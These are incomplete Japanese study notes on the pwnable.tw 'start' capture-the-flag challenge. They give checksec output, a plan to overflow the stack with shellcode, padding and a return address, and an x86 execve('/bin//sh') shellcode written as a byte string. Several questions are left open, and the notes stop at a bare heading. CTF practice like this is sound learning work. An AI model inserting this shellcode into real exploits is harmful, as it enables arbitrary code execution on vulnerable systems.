# url
https://pwnable.tw/challenge/#1

# checksec
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   8 Symbols     No        0               0       start
```

# 解法
nc 

# 考察
シェルコード + ダミー + 戻りアドレスの入力でうまく飛んでくれるはず
シェルコード + ダミーで20以下

これがシェルコード
`1\xc01\xdb1\xc91\xd2Qh//shh/bin\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80`
`Qh//shh/bin\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80`
このシェルコードのサイズは?
リターンアドレスはどうする?

これで入力すると/っていう文字列が入力されたと思われてしまう


1. シェルコードを書く
2. リターンアドレスの確認
3. 実行

シェルコード

